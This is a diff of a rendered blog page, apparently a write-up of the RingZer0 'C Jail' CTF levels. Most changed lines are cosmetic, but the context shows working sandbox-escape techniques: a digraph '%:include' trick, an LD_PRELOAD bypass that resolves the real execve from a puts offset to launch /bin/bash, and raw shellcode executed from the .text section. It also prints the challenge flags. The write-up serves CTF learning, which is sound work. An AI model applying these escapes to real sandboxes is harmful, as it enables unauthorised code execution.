@@ -26,7 +26,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.75.1" />
+<meta name="generator" content="Hugo 0.89.4" />
 
 <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
 <style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
@@ -42,6 +42,10 @@
 <link href='https://blog.dornea.nu/css/styles.css' rel="stylesheet">
 <link rel="stylesheet" href="https://blog.dornea.nu/css/custom.css">
 
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox/dist/css/glightbox.min.css" />
+<script src="https://cdn.jsdelivr.net/gh/mcstudios/glightbox/dist/js/glightbox.min.js"></script>
 
 
 <link rel="icon" 
@@ -92,7 +96,7 @@ type="image/x-icon"/>
 <li>Level 3: <a href="https://ringzer0team.com/challenges/230">https://ringzer0team.com/challenges/230</a></li>
 </ul>
 <h1 id="level-1">Level 1</h1>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level1@ringzer0team.com&#39;s password: 
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level1@ringzer0team.com&#39;s password: 
 Last login: Sun Apr 24 05:48:42 2016 from
 
 RingZer0 Team Online CTF
@@ -130,7 +134,7 @@ You CANNOT use the &#34;asm&#34; keyword
 -----------------------------
 Your C code:
 </code></pre></div><p>So obviously I have to write some C code to read the content of <code>/home/level1/flag.txt</code>. <code>fopen</code>/<code>fread</code> are not allowed so let&rsquo;s do it using <code>open</code>/<code>read</code>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
@@ -159,7 +163,7 @@ Your C code:
 }
 
 </code></pre></div><p>Keep in mind that you&rsquo;ll have to paste only the contents of <code>main()</code>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">----------------------------
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">----------------------------
 Your C code:
   <span style="color:#6ab825;font-weight:bold">int</span> fd;
     <span style="color:#6ab825;font-weight:bold">char</span> *filename = <span style="color:#ed9d13">&#34;flag.txt&#34;</span>;
@@ -188,7 +192,7 @@ Compiling your code.
 Executing your code.
 Flag: FLAG-ql3mI2Z8fGq56kK5QdwK8oMxgWwvji8R
 </code></pre></div><h1 id="level-2">Level 2</h1>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">RingZer0 Team Online CTF
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">RingZer0 Team Online CTF
 
 C Jail Level <span style="color:#3677a9">2</span>:
 Current user is uid=<span style="color:#3677a9">1001</span>(level2) gid=<span style="color:#3677a9">1001</span>(level2) groups=<span style="color:#3677a9">1001</span>(level2)
@@ -228,7 +232,7 @@ Your C code:
 </blockquote>
 <p>And of course there is <code>open64()</code>. <code>open()</code> and <code>open64()</code> use the <code>open</code> <strong>syscall</strong> internally. The main difference is that <code>open64()</code> is equivalent
 to <code>open()</code> with <em>O_LARGEFILE</em> in order to support <strong>large</strong> files in 32 bit applications. Here is my solution (shitty code, don&rsquo;t use in production :D):</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">-----------------------------
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">-----------------------------
 Your C code:
    <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">100</span>];
     FILE *fp;
@@ -253,7 +257,7 @@ Compiling your code.
 Executing your code.
 flag: FLAG-<span style="color:#3677a9">0416</span>ewrN2o058901Aqf4w9hsyH0dfqzd
 </code></pre></div><h1 id="level-3">Level 3</h1>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">RingZer0 Team Online CTF
 
 C Jail Level 3:
 Current user is uid=1002(level3) gid=1002(level3) groups=1002(level3)
@@ -294,7 +298,7 @@ first idea I should have think of some way how to re-write those hex codes to st
 <p>First I&rsquo;ll try to write down my thoughts which lead to the solution. Afterwards I&rsquo;ll show some other cool solutions I&rsquo;ve seen in the write-ups.</p>
 <h2 id="my-solution">My solution</h2>
 <p>After trying hard I&rsquo;ve decided to buy the hint:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">alias for old system?</span><span style="color:#cd2828;font-weight:bold">
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">alias for old system?</span><span style="color:#cd2828;font-weight:bold">
 </span></code></pre></div><p>Then I was looking for another <em>preprocessor</em> directives meant to <em>embed</em>/<em>include</em> code in other files. But I didn&rsquo;t find sth useful. Besides
 that all preprocessor directives start with &lsquo;#&rsquo; which was a bad keyword. However, this assumption was wrong.</p>
 <p>Somebody told me then that I should look for an &ldquo;old function&rdquo; which could do the same. Functions, you say. All&rsquo;right! At (<a href="https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)%5Bhttps://www.gnu.org/software/libc/manual/html_node/Function-Index.html%5D">https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)[https://www.gnu.org/software/libc/manual/html_node/Function-Index.html]</a> you can find all
@@ -315,7 +319,7 @@ inside <code>flag.txt</code>. Unfortunately after &ldquo;parsing&rdquo; the libc
 <p>Finally, somebody (thx nsr @nullsecurity.net IRC channel) told that there might be a way to accomplish &ldquo;#include&rdquo; without using &ldquo;#&rdquo;. The hint
 I was after was called <a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">Digraphs/Trigraphs</a>. Especially for the C language the preprocessor
 is able to replace digraphs/trigraphs by their <a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C">single-character equivalents before any other processing</a>. This way I was able to trigger the error message I was hoping for:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your C code:
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your C code:
 %:include &#34;/home/level3/flag.txt&#34;
 DONE
 
@@ -338,12 +342,12 @@ Your code does not compile.
 <h2 id="other-solutions">Other solutions</h2>
 <h3 id="bypass-ld_preload">Bypass LD_PRELOAD</h3>
 <p>As I&rsquo;ve noticed some functions (among these also <code>execve()</code>) were disabled due to the <code>LD_PRELOAD</code> override. Some <a href="https://ringzer0team.com/profile/2319">smart guy</a> managed it to find in memory the real libc functions and thus bypassing the <code>LD_PRELOAD</code> override. Using <a href="http://libcdb.com">libcdb.com</a> you can identify the exact version of the used libc version by finding out the addresses of some functions (in his case <code>puts</code> and <code>printf</code>):</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Compiling your code.
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Compiling your code.
 Executing your code.
 puts: 0x7ffe36166e30
 printf: 0x7ffe3614b400
 </code></pre></div><p>After finding the exact libc version, he/she downloaded the file and had a look at it:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ readelf -s libc-2.19_15.so | grep puts
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ readelf -s libc-2.19_15.so | grep puts
    184: 000000000006fe30   399 FUNC    GLOBAL DEFAULT   12 _IO_puts@@GLIBC_2.2.5
    400: 000000000006fe30   399 FUNC    WEAK   DEFAULT   12 puts@@GLIBC_2.2.5      &lt;--- the one we have
    471: 00000000000fef10  1031 FUNC    GLOBAL DEFAULT   12 putspent@@GLIBC_2.2.5      
@@ -356,13 +360,13 @@ $ greadelf -s libc-2.19_15.so | grep execve
    987: 00000000000c1360   200 FUNC    GLOBAL DEFAULT   12 fexecve@@GLIBC_2.2.5
   1418: 00000000000c1330    34 FUNC    WEAK   DEFAULT   12 execve@@GLIBC_2.2.5    &lt;--- the one we want
 </code></pre></div><p>By calculating the offset between <code>puts</code> and <code>execve</code> he/she could then build following code:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">int</span> (*real_execve)(<span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> *, <span style="color:#6ab825;font-weight:bold">char</span> *<span style="color:#6ab825;font-weight:bold">const</span> *, <span style="color:#6ab825;font-weight:bold">char</span> * <span style="color:#6ab825;font-weight:bold">const</span> *) = (<span style="color:#6ab825;font-weight:bold">void</span>*)puts + &lt;OFFSET&gt;;
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">int</span> (*real_execve)(<span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> *, <span style="color:#6ab825;font-weight:bold">char</span> *<span style="color:#6ab825;font-weight:bold">const</span> *, <span style="color:#6ab825;font-weight:bold">char</span> * <span style="color:#6ab825;font-weight:bold">const</span> *) = (<span style="color:#6ab825;font-weight:bold">void</span>*)puts + &lt;OFFSET&gt;;
 <span style="color:#6ab825;font-weight:bold">char</span> program[] = {<span style="color:#3677a9">47</span>, <span style="color:#3677a9">98</span>, <span style="color:#3677a9">105</span>, <span style="color:#3677a9">110</span>, <span style="color:#3677a9">47</span>, <span style="color:#3677a9">98</span>, <span style="color:#3677a9">97</span>, <span style="color:#3677a9">115</span>, <span style="color:#3677a9">104</span>, <span style="color:#3677a9">0</span>};
 real_execve(program, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>);
 </code></pre></div><p>Clever!</p>
 <h3 id="execute-shellcode">Execute shellcode</h3>
 <p>Since I was initially trying to execute shellcode, I was very curios about any similar solutions. <a href="https://ringzer0team.com/profile/5732">killer2</a> had a very elegant solution:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#999;font-style:italic">// Place the shellcode inside the .text section
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#999;font-style:italic">// Place the shellcode inside the .text section
 </span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">const</span> <span style="color:#6ab825;font-weight:bold">char</span> <span style="color:#447fcf">__attribute__</span>((section (<span style="color:#ed9d13">&#34;.text&#34;</span>))) code[] = { <span style="color:#3677a9">72</span>,<span style="color:#3677a9">129</span>,<span style="color:#3677a9">236</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">141</span>,<span style="color:#3677a9">52</span>,<span style="color:#3677a9">36</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">50</span>,<span style="color:#3677a9">90</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">192</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">135</span>,<span style="color:#3677a9">254</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">246</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">2</span>,<span style="color:#3677a9">88</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">141</span>,<span style="color:#3677a9">52</span>,<span style="color:#3677a9">36</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">100</span>,<span style="color:#3677a9">90</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">151</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">49</span>,<span style="color:#3677a9">192</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">1</span>,<span style="color:#3677a9">95</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">137</span>,<span style="color:#3677a9">194</span>,<span style="color:#3677a9">106</span>,<span style="color:#3677a9">1</span>,<span style="color:#3677a9">88</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">5</span>,<span style="color:#3677a9">72</span>,<span style="color:#3677a9">129</span>,<span style="color:#3677a9">196</span>,<span style="color:#3677a9">255</span>,<span style="color:#3677a9">15</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">0</span>,<span style="color:#3677a9">195</span> };
 
 <span style="color:#999;font-style:italic">// Run the shellcode
@@ -493,6 +497,13 @@ if (document.getElementById("contents-list") !== null && document.getElementsByC
 
 
 
+
+
+<script>
+ var glightbox = GLightbox({
+     selector: '.glightbox'
+ });
+</script>
 
   
 </body>
